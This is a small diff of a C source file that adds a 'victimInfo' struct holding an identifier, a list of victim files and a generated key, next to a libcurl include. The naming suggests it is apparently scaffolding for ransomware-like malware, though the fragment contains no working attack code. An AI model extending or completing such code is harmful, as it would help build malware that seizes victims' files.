@@ -4,11 +4,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <curl/curl.h>
+#include "FileNode.h"
 
 typedef struct victimInfo{
 
     char *identifier;
-    
+    FileNodes victimFiles;
+    char *generatedKey;
 
 }victimInfo;
 
